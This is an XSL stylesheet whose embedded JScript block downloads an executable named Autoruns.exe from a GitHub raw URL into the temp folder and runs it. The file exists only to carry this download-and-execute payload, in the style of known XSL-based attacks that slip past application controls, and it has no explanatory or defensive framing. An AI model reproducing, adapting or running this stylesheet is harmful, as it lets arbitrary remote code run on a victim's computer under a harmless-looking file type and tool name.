<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var Source = "https://raw.githubusercontent.com/tconqueror/bla/master/Autoruns.exe";
var Object = new ActiveXObject('MSXML2.XMLHTTP.6.0');
Object.Open('GET', Source, false);
Object.Send();
var r = new ActiveXObject('WScript.Shell');
var appdata = r.ExpandEnvironmentStrings("%temp%");
Target = appdata + "\\Autoruns.exe"
var Stream = new ActiveXObject('ADODB.Stream');
Stream.Type = 1; 
Stream.Open();
Stream.Write(Object.ResponseBody);
var File = new ActiveXObject('Scripting.FileSystemObject');
if (File.FileExists(Target))
{
    File.DeleteFile(Target);
}
Stream.SaveToFile(Target, 2);
Stream.Close();
r.Run(Target);
]]> 
</ms:script>
</stylesheet>
